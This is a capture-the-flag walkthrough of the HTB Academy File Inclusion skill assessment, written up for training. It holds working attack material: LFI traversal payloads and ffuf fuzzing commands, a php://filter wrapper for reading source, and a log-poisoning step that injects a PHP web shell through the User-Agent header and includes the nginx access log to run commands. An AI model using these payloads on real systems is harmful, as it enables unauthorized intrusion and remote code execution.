# Skill Assessment HTB File Inclusion Writeup

After completing the File Inclusion module on HTB Academy, I proceeded to the skill assessment. Below is a detailed walkthrough of my approach and findings.

## Target Reconnaissance
I began by navigating to the provided target in my browser.

After reviewing the site, I identified the page parameter as a potential vector for file inclusion, as shown in the screenshot above.

## Parameter Testing and LFI Fuzzing
Using Burp Suite, I intercepted requests and tested the page parameter with payloads from `LFI-Jhaddix.txt`. The responses indicated two distinct sizes: one for invalid input and another for less interesting content.

## Exploring PHP Wrappers 

Since direct LFI attempts yielded no valuable results, I pivoted to PHP wrappers. I first tried reading the contact resource using the php://filter wrapper and base64-decoded the output, but found nothing useful.

```bash
php://filter/read=convert.base64-encode/resource=contact
```

So I decoded it and found that its content was not useful so I thought of fuzzing the PHP files using ffuf
```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://83.136.255.230:36621/FUZZ.php
```

But when I tried with index as a resource. Found something interested. 
```bash
php://filter/read=convert.base64-encode/resource=index
```

Unsanitaized Admin page is found here. This indicates that there is a hidden Admin panel and it displays some logs.

I also noticed that there is another parameter that specifies the type of logs that are displayed, So I tried to use LFI payloads and it worked.

Then I tried to access the file that contains the web applicationâ€™s logs by fuzzing these files to reach the correct path.

```bash
ffuf -w ./Downloads/LFI-gracefulsecurity-linux.txt:FUZZ -u http://94.237.55.96:37944/ilf_admin/index.php?log=../../../../../../../../../../FUZZ -fs 2046
```

```bash
index.php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=id
User Agent: <?php system ($_GET['cmd']); ?>
```

Found uid, gid and groups that means we can confirm _Remote Code Execution (RCE)_ and can get the flag by using shell as a user agent.
## Confirmed Remote Code Execution and Retrieving the Flag

With code execution established, I used the same technique to list files and retrieve the flag.

### This lists out the files/folders in the directory.
```bash
php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=ls+/
```

### This retrives the flag.
```bash
php?log=../../../../../../../../../..//var/log/nginx/access.log&cmd=cat+/<file_name>
```
Happy Hacking.
